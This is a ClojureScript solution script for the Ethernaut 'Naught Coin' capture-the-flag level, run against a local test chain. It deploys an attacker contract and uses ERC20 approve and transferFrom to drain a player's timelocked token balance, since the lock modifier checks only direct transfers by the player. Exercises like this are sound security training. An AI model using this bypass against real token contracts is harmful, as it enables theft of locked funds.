(ns ctf.ethernaut.naught-coin
  "We will deploy an Attacker contract and 'Approve' it
  to spend the balance on our behalf.

   if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
     _;
    }
  }

  The lock tokens modifier only check for vesting period
  if the 'Player' tries to spend his balance.

  With the ERC20's `approve` and `transferFrom`
  flow Attacker Contract can
  withdraw its balance (check is skipped as msg.sender != player)
  and send to itself."
  (:require [ctf.ethernaut.utils :as u]
            [ctf.ethernaut.wallets :as w]
            [cljs.core.async :as a]
            [cljs.core.async.interop :refer-macros [<p!]])
  (:require-macros [ctf.core :refer [try-async]]))


;; Init the a new wallet for the player
;; Attach it with the local provider
(def player
  (w/get-player! w/local-provider))


(defn deploy-naught-coin!
  "Deploys the NaughCoin contract using Owner's wallet!
   Pass palyer's address, to give initial supply to the palyer
   Returns the `js/Promise`."
  [addr]
  (let [contract (u/contract :naught-coin
                             w/local-wallet)]
    (.deploy contract addr)))


(defn deploy-attacker!
  "Deploys the Attacker contract using player's wallet!
   Returns the `js/Promise`."
  []
  (let [contract (u/contract :naught-coin/attack
                             player)]
    (.deploy contract)))


(defn naught-attack
  []
  (try-async
   [naught   (<p!(deploy-naught-coin! (.-address player)))
    attacker (<p! (deploy-attacker!))
    balance  (<p! (.balanceOf naught
                              (.-address player)))]

   (do
     (<p! (.approve (.connect naught player)
                    (.-address attacker)
                    balance))
     (<p!
      (.attack (.connect attacker player)
               (.-address naught)
               balance
               (js-obj "gasLimit"
                       4000000
                       "value"
                       (u/eth-str->wei "0.01"))))
     (<p! (.balanceOf naught (.-address player))))))


(comment

  ;; Execute the code to attack
  ;; it should print 0 (player's final balance)
  (a/take!
   (naught-attack)
   #(.log js/console %))


  (-> (u/compile-all!)
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))

  (def naught (atom ""))

  (-> (deploy-naught-coin! (.-address player))
      (.then #(reset! naught %))
      (.catch #(.log js/console %)))

  (def attacker (atom ""))

  (-> (deploy-attacker!)
      (.then #(reset! attacker %))
      (.catch #(.log js/console %)))


  (def balance (atom ""))

  (.keys js/Object (.-address (.-signer @naught)))

  (-> (.balanceOf @naught
                  (.-address player))
      (.then #(reset! balance %))
      (.catch #(.log js/console %)))


  (-> (.approve (.connect @naught player)
                (.-address @attacker)
                @balance)
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))

  ;; check allowance
  (-> (.allowance @naught
                  (.-address player)
                  (.-address @attacker))

      (.then #(.log js/console %))
      (.catch #(.log js/console %)))


  (-> (.attack (.connect @attacker player)
               (.-address @naught)
               @balance
               (js-obj "gasLimit" 4000000
                       "value" (u/eth-str->wei "0.01")))
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))




  )
